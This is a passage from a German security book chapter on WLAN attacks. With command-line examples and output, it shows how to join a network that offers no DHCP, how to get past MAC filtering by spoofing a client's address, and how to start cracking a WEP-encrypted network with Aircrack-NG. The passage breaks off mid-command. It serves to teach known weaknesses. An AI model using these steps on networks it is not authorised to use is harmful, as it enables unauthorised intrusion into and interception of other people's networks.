zus\u00e4tzliche Informationen (vgl. Abb. 16.35).\n292\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.34: Kismet-Newcore bei der Aufdeckung eines vormals unsichtbaren WLAN\nBild 16.35: Weitere Informationen zum ehemals verborgenen WLAN\nMit der durch Kismet-Newcore aufgedeckten SSID des urspr\u00fcnglich unsichtbaren Funknetzes l\u00e4sst sich der Zugang abschlie\u00dfend so aufbauen, wie im Szenario \u00bbZugriff auf ein offenes WLAN\u00ab beschrieben (mit den Kommandos iwconfig, ifconfig und dhclient).\n16.3.3 Zugriff auf ein WLAN, das keinen DHCP-Dienst anbietet Hat der Betreiber des WLAN daf\u00fcr gesorgt, dass keine IP-Adressen per DHCP angeboten werden (z. B. durch Deaktivierung des oftmals im Access-Point anzutreffenden DHCP-Dienstes), laufen Anfragen des DHCP-Clients wie beispielsweise dhclient ins Leere, und es bedarf einer manuellen Vergabe der Netzwerkeinstellungen. Der Knack-\n16.3 Angriffe auf Funknetze\n293\npunkt dabei: Der Funknetzforscher muss \u2013 bevor er mitspielen kann \u2013 ermitteln, welche Netzwerkparameter (IP-Adressen, Subnetz und Gateway) zum Einsatz kommen. Hierbei handelt es sich um keine un\u00fcberwindbare H\u00fcrde: Wir erinnern uns daran, dass Kismet-Newcore die IP-Adressen beteiligter Ger\u00e4te des Funknetzes in Erfahrung bringen kann (vgl. hierzu das Szenario \u00bbZugriff auf ein WLAN, dessen Hot-Spot keine SSID sendet\u00ab). Haben wir somit mittels Kismet Kenntnis \u00fcber relevante Netzwerkparameter erlangt, vergeben wir eigenh\u00e4ndig eine IP-Adresse, die im Netzwerk noch nicht vergeben sein darf, und k\u00f6nnen uns somit wie folgt in das Netzwerk einbuchen: root@discordia:~# ifconfig wlan0 192.168.3.23 netmask 255.255.255.0 up root@discordia:~#\nMit dem Kommando ping l\u00e4sst sich pr\u00fcfen, ob tats\u00e4chlich Konnektivit\u00e4t besteht. Hierzu kontaktieren wir einen durch Kismet-Newcore entdeckten Host, z. B. 192.168.3.187. root@discordia:~# ping 192.168.3.187 PING 192.168.3.187 (192.168.3.187) 56(84) bytes of data. 64 bytes from 192.168.3.187: icmp_seq=1 ttl=247 time=73.8 ms 64 bytes from 192.168.3.187: icmp_seq=2 ttl=247 time=33.1 ms ^C --- 192.168.3.187 ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 33.143/53.496/73.850/20.354 ms root@discordia:~#\nErhalten wir wie in unserem Beispiel R\u00fcckmeldung vom Host, sind wir fester Bestandteil des Netzwerks. Aber Achtung: Beim Kommando ping handelt es sich bereits um einen aktiven Verbindungsaufbau! Bedient sich der Betreiber des WLAN beispielsweise eines IDS (Intrusion Detection System), kann der Netzwerkforscher schon jetzt entdeckt werden. Wer zun\u00e4chst unbeobachtet bleiben m\u00f6chte, analysiert idealerweise eine Weile passiv den Netzwerkverkehr und verwendet die dadurch gewonnenen Informationen f\u00fcr eine angepasste Herangehensweise. Wer die \u00bbger\u00e4uschlose\u00ab Variante bevorzugt, findet in einer Software zur \u00dcberwachung und Auswertung von Netzwerkverkehr einen Freund \u2013 im Folgenden verdeutlicht durch Tcpdump: root@discordia:~# tcpdump -i wlan0 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on wlan0, link-type EN10MB (Ethernet), capture size 96 bytes 16:46:06.678479 IP 192.168.3.198.netbios-dgm > 192.168.3.255.netbios-dgm: NBT UDP PACKET(138) 16:46:06.705178 arp who-has 192.168.3.1 tell 192.168.3.199 16:46:06.707794 arp reply 192.168.3.133 is-at 00:04:76:26:cc:78 (oui Unknown) 16:46:06.707806 IP 192.168.3.199.51408 > 192.168.3.133.domain: 26646+ PTR? 255.3.168.192.in-addr.arpa. (44)\n294\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\n16:46:06.709069 IP 192.168.3.133.domain > 192.168.3.199.51408: 26646 NXDomain* 0/0/0 (44) 16:46:06.709440 IP 192.168.3.199.49875 > 192.168.3.133.domain: 14565+ PTR? 198.3.168.192.in-addr.arpa. (44) 16:46:06.711335 IP 192.168.3.133.domain > 192.168.3.199.49875: 14565 NXDomain* 0/0/0 (44) 16:46:06.711559 IP 192.168.3.199.56168 > 192.168.3.133.domain: 43150+ PTR? 1.3.168.192.in-addr.arpa. (42) 16:46:06.713458 IP 192.168.3.133.domain > 192.168.3.199.56168: 43150 NXDomain* 0/0/0 (42) 16:46:06.713634 IP 192.168.3.199.43049 > 192.168.3.133.domain: 53411+ PTR? 199.3.168.192.in-addr.arpa. (44) 16:46:06.715636 IP 192.168.3.133.domain > 192.168.3.199.43049: 53411 NXDomain* 0/0/0 (44) 16:46:11.710455 arp who-has 192.168.3.199 tell 192.168.3.133 16:46:11.710481 arp reply 192.168.3.133 is-at 00:21:5c:54:7d:cd (oui Unknown) ^C 13 packets captured 13 packets received by filter 0 packets dropped by kernel root@discordia:~#\nWem die Resonanz von Tcpdump zu d\u00fcrftig erscheint, mag einen Blick auf netdiscover130 werfen \u2013 auch wenn wir uns mit diesem Tool, welches ARP-Requests sendet und auf R\u00fcckmeldung aus dem Netzwerk wartet, bedrohlich der Gattung der Netzwerkscanner n\u00e4hern: root@discordia:~# netdiscover -i wlan0 Currently scanning: 192.168.98.0/16 |\nOur Mac is: 00:21:5c:54:7d:cd \u2013 0\n4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 186 ___________________________________________________________________________ ---------------------------------------------------------------------------IP At MAC Address Count Len MAC Vendor ---------------------------------------------------------------------------192.168.3.1 00:04:76:26:cc:78 01 060 Unknown vendor 192.168.3.133 00:22:6b:70:1e:fc 01 042 Unknown vendor 192.168.3.186 00:24:36:f0:9b:2e 01 042 Unknown vendor 192.168.3.198 00:24:2b:2e:52:c8 01 042 Unknown vendor root@discordia:~#\n130\nhttp://nixgeneration.com/~jaime/netdiscover\n16.3 Angriffe auf Funknetze\n295\nDa netdiscover eine Zuordnung zwischen IP-Adresse und MAC-Adresse vornimmt, f\u00e4llt die Ermittlung der IP-Adresse des Hot-Spot \u2013 und somit dem verwendeten Netzwerkbereich \u2013 durch das Zusammenspiel mit Kismet-Newcore nicht weiter schwer. Wir erinnern uns: Kismet liefert reichhaltige Eckdaten \u00fcber die entdeckten Hot-Spots wie beispielsweise dem Basic Service Set Identifier (BSSID/Mac-Adresse). Weitere M\u00f6glichkeiten zur Feststellung des im Einsatz befindlichen Netzbereiches beschreiben wir im Kapitel \u00bbNetzwerkarbyten\u00ab. Die Feststellung des Gateways und der DNS-Server bereitet im Regelfall keine Kopfschmerzen, auch wenn dies immer von der jeweiligen Situation abh\u00e4ngt. Wir halten fest: Mit der IP-Adresse, die wir eingangs gew\u00e4hlt haben, k\u00f6nnen wir uns zwar im dazu passenden Netzbereich tummeln, der Zugriff auf ein anderes Netzsegment (wie beispielsweise dem Internet) ist damit aber noch nicht m\u00f6glich. Uns fehlen dazu Informationen zum Gateway. Hierzu ein Tipp aus der eigenen Erfahrung: Bei Funknetzen, die in Privathaushalten und im SOHO-Umfeld betrieben werden, kommen in den meisten F\u00e4llen kompakte WLANRouter zum Einsatz, die Access-Point, DSL-Router, DNS-Server, DHCP-Server, Gateway und mittlerweile auch File-/Druckserver in einem Ger\u00e4t vereinen (z. B. von den Firmen AVM, Cisco/Linksys, Netgear oder D-Link). Hier f\u00e4llt die Entscheidung, den passenden Gateway zu finden, meist nicht schwer: Wer die IP-Adresse des WLANRouters entdeckt \u2013 wie soeben durch die Kombination von netdiscover und KismetNewcore verdeutlicht \u2013 ist f\u00fcr alles Weitere gewappnet. Da moderne WLAN-Router meist ein Webinterface zur Konfiguration mitbringen ist der Hot-Spot schnell validiert (im simpelsten Fall fragen wir die entdeckten IP-Adressen durch Telnet auf Port 80 oder einem Webbrowser ab). Stolpern wir dadurch z. B. \u00fcber ein Bild wie das folgende, war die Suche erfolgreich und wir verwenden mit dem Kommando route die IP-Adresse 192.168.3.133 als unseren Gateway.\nBild 16.36: : Bei der IP-Adresse 192.168.3.133 handelt es sich um einen AccessPoint von Netgear\nroot@discordia:~# route add default gw 192.168.3.133 root@discordia:~#\n296\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nVerl\u00e4uft der Aufruf einer IP-Adresse im Internet erfolgreich, dann wissen wir zum einen, dass wir den richtigen Gateway gew\u00e4hlt haben, und zum zweiten, dass es sich bei dem Hot-Spot um einen Access-Point mit Internetzugang handelt: root@discordia:~# ping 193.99.144.85 PING 193.99.144.85 (193.99.144.85) 56(84) bytes of data. 64 bytes from 193.99.144.85: icmp_seq=1 ttl=247 time=73.8 ms 64 bytes from 193.99.144.85: icmp_seq=2 ttl=247 time=33.1 ms ^C --- 193.99.144.85 ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 33.143/53.496/73.850/20.354 ms root@discordia:~#\nZugegeben, die IP-Adresse unseres Beispiels ist etwas ungew\u00f6hnlich. Oftmals handelt es sich beim letzten Oktett der IP-Adresse eines WLAN-Routers um die Zahl 1. Die IPAdresse 192.168.3.1 d\u00fcrfte in freier Wildbahn somit h\u00e4ufiger anzutreffen sein als die von uns verwendete 192.168.3.133. Diverse Hersteller best\u00fccken ihre Ger\u00e4te auch mit den IP-Adressen 192.168.0.1 oder 192.168.1.1. \u00c4ndern die Betreiber der Funknetze die Defaulteinstellungen nicht, verbleibt die IP-Adresse der Fabrikkonfiguration auf dem Ger\u00e4t. Der Zugriff auf das Internet funktioniert in unserem Beispiel zwar jetzt, eine Namensaufl\u00f6sung mittels DNS findet aber noch nicht statt. Hierf\u00fcr bedarf es der Eintragung eines DNS-Servers. Bietet der WLAN-Router auch gleichzeitig einen DNS-Dienst an, er\u00fcbrigt sich die weitere Suche: Unter Debian GNU/Linux tragen wir in der Datei /etc/resolv.conf die IP-Adresse des Hot-Spots ein und k\u00f6nnen uns fortan an einer Namensaufl\u00f6sung erfreuen. nameserver 192.168.3.133\nFindet sich kein DNS-Server im WLAN/LAN (hier ist m\u00f6glicherweise eine netzwerkseitige Betrachtung der UDP-Anfragen auf Port 53 angeraten), greifen wir auf \u00f6ffentliche DNS-Server im Internet zur\u00fcck; zahlreiche Websites131 f\u00fchren Aufstellungen \u00f6ffentlich zug\u00e4nglicher DNS-Server, auch OpenDNS132 stellt eine gute Wahl dar. Sehr elegant l\u00e4sst sich im \u00dcbrigen die Datei /etc/resolv.conf durch folgenden Weg mit neuen DNS-Eintr\u00e4gen best\u00fccken: root@discordia:~# sh -c \"echo nameserver 208.67.220.220 > /etc/resolv.conf\" root@discordia:~#\nBei einem weiteren Versuch, mit dem Kommando ping einen Host zu erreichen, greifen wir auf die soeben aktivierte Namensaufl\u00f6sung zur\u00fcck und haben somit vollwertigen\n131\nEin Register \u00f6ffentlich zug\u00e4nglicher DNS-Server findet sich z. B. unter http://www.stanar.de\n132\nhttp://www.opendns.com\n16.3 Angriffe auf Funknetze\n297\nZugang zum Internet. Das alles unter der Bedingung, dass keine Filter z. B. seitens eines WLAN-Routers greifen. root@discordia:~# ping heise.de PING heise.de (193.99.144.80) 56(84) bytes of data. 64 bytes from redirector.heise.de (193.99.144.80): icmp_seq=1 ttl=247 time=34.6 ms 64 bytes from redirector.heise.de (193.99.144.80): icmp_seq=2 ttl=247 time=27.5 ms ^C --- heise.de ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 27.553/31.084/34.616/3.535 ms root@discordia:~#\nAuch wenn wir hier erfolgreich waren, m\u00fcssen wir an dieser Stelle darauf hinweisen, dass bei der Vielzahl m\u00f6glicher Einstellungen mehrere der hier vorgestellten Werte vom Einzelfall abh\u00e4ngig sind.\n16.3.4 Zugriff auf ein mit MAC-Filter gesichertes WLAN Eine von vielen WLAN-Betreibern eingesetzte Zugangssperre ist weiterhin die Filterung von MAC-Adressen. Bei einer MAC-Adresse handelt es sich um eine weltweit eindeutige Hardwareadresse jedes einzelnen Netzwerkadapters, die zur eindeutigen Identifikation des Ger\u00e4ts im Netzwerk dient. Zum Vergleich bietet sich die Fahrgestellnummer eines KFZ an. Das Prinzip ist simpel: Die Filterung von MAC-Adressen am Hot-Spot dient dem Zweck, ausschlie\u00dflich berechtigten und im Vorfeld eingetragenen Netzwerkkarten Zutritt zum WLAN zu gew\u00e4hren. Alle anderen Netzwerkkarten, deren MAC-Adressen sich nicht auf der Liste befinden, d\u00fcrfen nicht mitspielen und m\u00fcssen drau\u00dfen bleiben. Soweit die Theorie. In der Praxis sieht dies nat\u00fcrlich anders aus. Alles, was wir dazu ben\u00f6tigen, ist die MACAdresse einer validen Netzwerkkarte und ein Zeitfenster, in dem wir dem WLAN mit einer gef\u00e4lschten MAC-Adresse auf den Pelz r\u00fccken. Zun\u00e4chst starten wir Kismet-Newcore und beobachten das Funknetz, bei dem wir davon ausgehen, dass ein MAC-Filter zum Einsatz kommt. Ein m\u00f6gliches Indiz f\u00fcr einen MAC-Filter liefert z. B. der Umstand, dass ein WLAN unverschl\u00fcsselt oder bereits gebrochen ist, uns das Einloggen des eigenen Clients aber partout nicht gelingen will. In unserem Beispiel widmen wir dem WLAN mit der SSID BARCODESCANNER unsere Aufmerksamkeit.\n298\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.37: Kismet-Newcore bei der Beobachtung eines WLAN mit der BSSID BARCODESCANNER\nEin beherzter Klick auf die Taste (Return) l\u00e4sst erahnen, dass sich diverse WLAN-Clients im Funknetz tummeln k\u00f6nnten; zumindest deutet die hohe Datendichte im Feld \u00bbPacket Rate\u00ab zielsicher darauf hin:\nBild 16.38: Kismet-Newcore entlockt dem WLAN eine hohe Datendichte\nUnsere Vermutung, dass wir uns in guter Gesellschaft befinden, l\u00e4sst sich durch eine \u00dcbersicht der im WLAN befindlichen Clients best\u00e4tigen. Die Bet\u00e4tigung der Tasten (ALT-V) und (c) f\u00fcr \u00bbView \u2013 Clients\u00ab liefert erhellende Details und die Gewissheit, MAC-Adressen in f\u00fcr unser Vorhaben ausreichender Zahl erhascht zu haben. Was hierbei sehr hilfreich ist: Die meisten WLAN-Netzwerkger\u00e4te im SOHO-Bereich \u00fcbertragen die MAC-Adresse auch dann noch im Klartext, wenn WEP aktiviert ist. Bei einem g\u00e4nzlich unverschl\u00fcsselten WLAN \u2013 wie in unserem Beispiel \u2013 ist dies nat\u00fcrlich auch der Fall, wie die folgende Abbildung belegt:\n16.3 Angriffe auf Funknetze\n299\nBild 16.39: Kismet-Newcore bei der Entdeckung von Clients samt MAC-Adressen\nBei n\u00e4herer Betrachtung wird schnell klar, dass in diesem Funknetz die Clients mit den IP-Adressen 192.168.3.198, 192.168.3.193 und 192.168.3.196 Daten austauschen, hinter der 192.168.3.1 und einer bislang nicht identifizierten IP-Adresse m\u00f6gen sich Netzwerkkomponenten wie Access-Point und Firewall/Router befinden. Hilfreich ist, dass auch hier die MAC-Adressen sehr anschaulich und redselig in Erscheinung treten. Die Daten notieren wir uns sicherheitshalber, um anschlie\u00dfend \u2013 und zumindest von der MACAdresse her \u2013 in die Rolle eines dieser Clients schl\u00fcpfen zu k\u00f6nnen. Meldet sich einer der berechtigten Clients aus dem Funknetz ab, ist dies nicht nur die ideale Gelegenheit f\u00fcr einen Identit\u00e4tsdiebstahl, sondern gleichzeitig eine zwingende Voraussetzung f\u00fcr unser Vorhaben. F\u00fcr den Fall, dass uns keiner der Clients den Gefallen erf\u00fcllt, sich freiwillig aus dem WLAN zur\u00fcckzuziehen, k\u00f6nnen wir selbstredend ein klein wenig nachhelfen \u2013 wohl wissend, dass wir mit dieser aktiven Ma\u00dfnahme m\u00f6glicherweise den Betreiber des Funknetzes auf uns aufmerksam machen. Details zu dieser freundlichen Form der \u00bbUnterst\u00fctzung\u00ab unter Zuhilfenahme des AMOK-MODE (Deauthentication and Disassociation) von \u00bbMDK3133\u00ab erfolgt im \u00fcbern\u00e4chsten Kapitel. Exemplarisch folgt eine Betrachtung der WLAN-Karte wlan0 unter normalen Bedingungen. Das Interessante hierbei ist die Verwandlung der MAC-Adresse, zu erkennen hinter dem Eintrag HWaddr: root@discordia:~# ifconfig wlan0 wlan0 Link encap:Ethernet HWaddr 00:21:5c:54:7d:cd UP BROADCAST PROMISC MULTICAST MTU:1500 Metric:1 RX packets:61375 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:17184727 (17.1 MB) TX bytes:0 (0.0 B) root@discordia:~#\n300\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nZun\u00e4chst beginnen wir mit der Deaktivierung der WLAN-Karte: root@discordia:~# ifconfig wlan0 down root@discordia:~#\nIm Anschluss daran vergeben wir \u00fcber iwconfig die gew\u00fcnschte SSID und vergewissern uns der Korrektheit der \u00fcbermittelten Werte. Nach dem anschlie\u00dfendem Hochfahren des Netzwerkinterfaces weigert sich der Hot-Spot auch weiterhin, eine Verbindung mit uns einzugehen. Das l\u00e4sst sich am Eintrag Access-Point: Not-Associated erkennen, obwohl die (E)SSID korrekt angesprochen wird: root@discordia:~# iwconfig wlan0 essid BARCODESCANNER root@discordia:~# ifconfig wlan0 up root@discordia:~# iwconfig wlan0 wlan0 IEEE 802.11abgn ESSID:\"BARCODESCANNER\" Mode:Managed Frequency:2.427 GHz Access Point: Not-Associated Tx-Power=15 dBm Retry min limit:7 RTS thr:off Fragment thr=2352 B Encryption key:off Power Management:off Link Quality:0 Signal level:0 Noise level:0 Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:0 Missed beacon:0 root@discordia:~#\nNach erneutem Shutdown des Netzwerkinterfaces weisen wir unserer Netzwerkkarte mit ifconfig und dem Parameter hw ether eine andere MAC-Adresse zu (alternativ zu ifconfig bietet sich auch \u00bbmacchanger134\u00ab an). Konkret handelt es sich bei der mittlerweile zugewiesenen Ethernet-ID um die MAC-Adresse eines zwischenzeitlich vom Funknetz abgemeldeten WLAN-Clients, die wir wenige Minuten vorher mit Kismet-Newcore ermittelt hatten. root@discordia:~# ifconfig wlan0 down root@discordia:~# ifconfig wlan0 hw ether 00:26:08:12:12:28 root@discordia:~#\n133\nhttp://homepages.tu-darmstadt.de/~p_larbig/wlan/#mdk3\n134\nhttp://www.alobbs.com/macchanger\n16.3 Angriffe auf Funknetze\n301\nIst die neue Hardwareinformation vergeben, fahren wir die Netzwerkkarte wieder hoch und k\u00f6nnen uns mit ifconfig wlan0 davon \u00fcberzeugen, dass die neue MAC-Adresse anstandslos \u00fcbernommen wurde: root@discordia:~# ifconfig wlan0 up root@discordia:~# ifconfig wlan0 wlan0 Link encap:Ethernet HWaddr 00:26:08:12:12:28 inet6 addr: fe80::226:8ff:fe12:1228/64 Scope:Link UP BROADCAST RUNNING PROMISC MULTICAST MTU:1500 Metric:1 RX packets:61376 errors:0 dropped:0 overruns:0 frame:0 TX packets:5 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:17184755 (17.1 MB) TX bytes:498 (498.0 B) root@discordia:~#\nDem aufmerksamen Leser wird an dieser Stelle nicht entgangen sein, dass wir der eigentlichen MAC-Adresse unserer Netzwerkkarte jetzt einen anderen, vom fremden WLAN akzeptierten Wert zugewiesen haben, sodass ein iwconfig die ersehnte Koppelung an den Hot-Spot liefert: root@discordia:~# iwconfig wlan0 wlan0 IEEE 802.11abgn ESSID:\"BARCODESCANNER\" Mode:Managed Frequency:2.412 GHz Access Point: 00:22:6B:70:1E:FE Bit Rate=54 Mb/s Tx-Power=15 dBm Retry min limit:7 RTS thr:off Fragment thr=2352 B Encryption key:off Power Management:off Link Quality=100/100 Signal level:-48 dBm Noise level=-93 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:0 Missed beacon:0 root@discordia:~#\nDas Kommando dhclient, welches den im Netzwerk befindlichen DHCP-Server kontaktiert, liefert uns schlie\u00dflich eine IP-Adresse und die Gewissheit \u2013 der ausgeliehenen MAC-Adresse sei Dank \u2013, Bestandteil des WLAN zu sein und somit erfolgreich den MAC-Filter umgangen zu haben.\n302\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nroot@discordia:~# dhclient wlan0 Internet Systems Consortium DHCP Client V3.1.1 Copyright 2004-2008 Internet Systems Consortium. All rights reserved. For info, please visit http://www.isc.org/sw/dhcp/ Listening on LPF/wlan0/00:26:08:12:12:28 Sending on LPF/wlan0/00:26:08:12:12:28 Sending on Socket/fallback DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 5 DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 11 DHCPOFFER of 192.168.3.199 from 192.168.3.1 DHCPREQUEST of 192.168.3.199 on wlan0 to 255.255.255.255 port 67 DHCPACK of 192.168.3.199 from 192.168.3.1 bound to 192.168.3.199 -- renewal in 1357 seconds. root@discordia:~# ping nsa.gov PING nsa.gov (12.120.66.169) 56(84) bytes of data. 64 bytes from redirector.nsa.gov (12.120.66.169): icmp_seq=1 ttl=247 time=32.4 ms 64 bytes from redirector.nsa.gov (12.120.66.169): icmp_seq=2 ttl=247 time=24.9 ms ^C --- nsa.gov ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 24.989/28.733/32.478/3.748 ms root@discordia:~#\n16.3.5 Zugriff auf ein WEP-verschl\u00fcsseltes WLAN Bei vielen der derzeit betriebenen Funknetze kommt auch weiterhin der ehemalige Standardverschl\u00fcsselungsalgorithmus WEP (Wired Equivalent Privacy) zum Einsatz (vgl. dazu die Feldstudie135 des Informatikers Stefan D\u00f6rh\u00f6fer der RWTH Aachen), der sowohl Zugang zum Netz als auch die Integrit\u00e4t der Daten sicherstellen soll. Im Nachhinein betrachtet muss der Versuch, mittels WEP eine Verschl\u00fcsselung f\u00fcr Funknetze zu schaffen, um damit eine \u00e4hnliche Abh\u00f6rsicherheit wie bei kabelgebundenen Netzen zu bieten, als gescheitert angesehen werden: Bereits im Jahr 2001 wurden die Schw\u00e4chen theoretisch136, ein Jahr sp\u00e4ter auch praktisch durch das Programm Airsnort137 nachgewiesen. Der Todessto\u00df jedoch wurde im Jahr 2004 durch Forscher der Technischen Universit\u00e4t Darmstadt138 versetzt, denen ein weiterer Durchbruch beim 135\nStefan D\u00f6rh\u00f6fer: Empirische Untersuchungen zur WLAN-Sicherheit mittels Wardriving, https://pi1.informatik.uni-mannheim.de/diplomas/show/48\n136\nhttp://www.drizzle.com/~aboba/IEEE/rc4_ksaproc.pdf\n137\nhttp://airsnort.shmoo.com\n138\nhttp://www.tu-darmstadt.de\n16.3 Angriffe auf Funknetze\n303\nKnacken WEP-verschl\u00fcsselter Funknetzwerke gelungen war: So konnte das Team um Erik Tews die Menge der f\u00fcr einen erfolgreichen Angriff erforderlichen mitgeschnittenen Pakete auf weniger als ein Zehntel reduzieren, wodurch sich ein mit einem 128-BitWEP-Schl\u00fcssel gesichertes Funknetz im Idealfall unter einer Minute knacken l\u00e4sst139. Obgleich Airsnort mittlerweile nicht mehr weiterentwickelt wird, existiert dank Aircrack-NG140 \u2013 insbesondere seit der Verschmelzung mit Aircrack-PTW141 \u2013 ein w\u00fcrdiger Erbe. Mehr dazu sp\u00e4ter. Wir halten somit vorerst fest, dass WEP alles andere als sicher ist, auch nicht als Zugangsschutz taugt und somit korrekterweise als \u00bbWireless Encryption Placebo\u00ab betitelt werden m\u00fcsste. Warum dem so ist, werden wir innerhalb der n\u00e4chsten Seiten anhand eines praktischen Beispiels verdeutlichen: Wir brechen in ein mit WEP verschl\u00fcsseltes Funknetzwerk ein. Erneut starten wir Kismet-Newcore und suchen Funknetze, die f\u00fcr unser Vorhaben in Frage kommen. In unserem jetzigen Beispiel gilt dem WEP-verschl\u00fcsselten WLAN mit der SSID SCHULBEHOERDE unsere Aufmerksamkeit.\nBild 16.40: Kismet-Newcore bei der Beobachtung eines WLAN mit der BSSID SCHULBEHOERDE\nUm unser zuk\u00fcnftiges Ziel nicht aus den Augen zu verlieren, behalten wir sicherheitshalber die MAC-Adresse (BSSID) und den verwendeten Kanal (Kanal Nummer 2) des Hot-Spots im Hinterkopf (sowohl zu erfahren in der zentralen \u00dcbersicht von KismetNewcore als auch durch die bereits vorgestellte Detailansicht).\n139\nhttp://eprint.iacr.org/2007/120.pdf\n140\nhttp://www.aircrack-ng.org\n141\nhttp://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw\n304\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.41: Kismet bei der Darstellung zus\u00e4tzlicher Details zum Funknetz, u. a. der BSSID\nAls n\u00e4chsten Schritt greifen wir zur leistungsf\u00e4higen Aircrack-NG-Suite \u2013 wohl wissend, dass es auch andere potente Programme wie beispielsweise WEPBuster142, WepAttack143 oder KisMAC144 gibt. Die Installation von Aircrack-NG gestaltet sich unter Debian GNU/Linux unkompliziert: Die Eingabe von apt-get install aircrack-ng reicht zur Installation aus. root@discordia:~# aptitude install aircrack-ng Paketlisten werden gelesen... Fertig Abh\u00e4ngigkeitsbaum wird aufgebaut Lese Status-Informationen ein... Fertig Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Lese Task-Beschreibungen... Fertig Die folgenden NEUEN Pakete werden zus\u00e4tzlich installiert: aircrack-ng libiw29{a} libnl1{a} wireless-tools{a} 0 Pakete aktualisiert, 4 zus\u00e4tzlich installiert, 0 werden entfernt und 7 nicht aktualisiert. Muss 0B/1554kB an Archiven herunterladen. Nach dem Entpacken werden 2798kB zus\u00e4tzlich belegt sein. Wollen Sie fortsetzen? [Y/n/?] Schreibe erweiterte Statusinformationen... Fertig W\u00e4hle vormals abgew\u00e4hltes Paket libnl1. (Lese Datenbank ... 34188 Dateien und Verzeichnisse sind derzeit installiert.)\n142\nhttp://code.google.com/p/wepbuster\n143\nhttp://wepattack.sourceforge.net\n144\nhttp://kismac-ng.org\n16.3 Angriffe auf Funknetze\n305\nEntpacke libnl1 (aus .../archives/libnl1_1.1-2_i386.deb) ... W\u00e4hle vormals abgew\u00e4hltes Paket libiw29. Entpacke libiw29 (aus .../libiw29_29-1.1_i386.deb) ... W\u00e4hle vormals abgew\u00e4hltes Paket wireless-tools. Entpacke wireless-tools (aus .../wireless-tools_29-1.1_i386.deb) ... W\u00e4hle vormals abgew\u00e4hltes Paket aircrack-ng. Entpacke aircrack-ng (aus .../aircrack-ng_1%3a1.0~rc1-2_i386.deb) ... Verarbeite Trigger f\u00fcr man-db ... Richte libnl1 ein (1.1-2) ... Richte libiw29 ein (29-1.1) ... Richte wireless-tools ein (29-1.1) ... Richte aircrack-ng ein (1:1.0~rc1-2) ... Paketlisten werden gelesen... Fertig Abh\u00e4ngigkeitsbaum wird aufgebaut Lese Status-Informationen ein... Fertig Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Schreibe erweiterte Statusinformationen... Fertig Lese Task-Beschreibungen... Fertig root@discordia:~#\nViele Linux-Live-CDs, wie beispielsweise GRML145 oder BackTrack146 bringen AircrackNG bereits von Haus aus mit. F\u00fcr die Anwender einer solchen Live-CD ist die Installation somit nicht weiter erforderlich. Freunde des Kompilierens k\u00f6nnen Aircrack-NG nach Beschaffung147 und Entpacken des Tarballs148 wie folgt einbinden: root@discordia:~/aircrack-ng-1.0# make root@discordia:~/aircrack-ng-1.0# make strip root@discordia:~/aircrack-ng-1.0# make install root@discordia:~/aircrack-ng-1.0#\nIst die Installation von Aircrack-NG erfolgreich abgeschlossen, m\u00fcssen wir zun\u00e4chst die WLAN-Karte durch das Kommando airmon-ng in den Monitor-Mode schalten. Hierbei w\u00e4hlen wir die WLAN-Karte wlan0, fixieren diese auf Kanal 2 und erhalten ein \u00bbmonitor mode enabled\u00ab zur\u00fcck.\n145\nhttp://www.grml.org\n146\nhttp://www.backtrack-linux.org\n147\nhttp://download.aircrack-ng.org/aircrack-ng-1.0.tar.gz\n148\nroot@discordia:~# tar xvfz aircrack-ng-1.0.tar.gz\n306\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nroot@discordia:/home/aircrack# airmon-ng start wlan0 2 root@discordia:/home/aircrack#\nBild 16.42: Die WLAN-Karte wird in den Monitor-Mode geschaltet\nIm nun folgenden Schritt weisen wir airodump-ng zum Mitscheiden der Datenpakete an, die innerhalb des von uns favorisierten WLAN aus Kanal 2 \u00fcbertragen werden. Mit der Option -c fixieren wir die Suche auf einen bestimmten Kanal, und mit -w bestimmen wir Pfad bzw. Datei des zu schreibenden Dumpfiles. root@discordia:~# airodump-ng -c 2 -w schulbehoerde.dump mon0\nBild 16.43: Airodump-NG beim Sammeln von Datenpaketen auf Kanal 3\n16.3 Angriffe auf Funknetze\n307\nAirodump-NG stellt seine Informationen zweigeteilt dar: Die erste Spalte bestehend aus BSSID, PWR ESSID, etc. listet die Access-Points auf. In der zweiten Spalte (eingeleitet mit BSSID und STATION) befinden sich die Clients, die mit den Access-Points in Verbindung stehen. Wir entnehmen der \u00dcbersicht, dass die Clients (Station) mit den MACAdressen 00:23:6C:85:EB:32 und 00:24:2B:2E:52:C8 eine Verbindung zum Access-Point mit der MAC-Adresse 00:14:6C:1D:1C:C2 (ESSID: SCHULBEHOERDE) unterhalten. Diese Verbandelung ist derzeit noch nicht von fundamentalem Interesse, wird aber dann spannend, wenn das WLAN nicht ausreichend Traffic abwirft. Wichtig ist nur, dass wir diese Logik im Hinterkopf behalten. Haben wir genug Netzwerkdaten zusammen, starten wir mit aircrack-ng das Kernprogramm der Aircrack-NG-Suite mit den folgenden Optionen. Hierbei beinhaltet der Parameter -b die BSSID des von uns ins Auge gefassten Funknetzes: root@discordia:~# aircrack-ng -0 -b 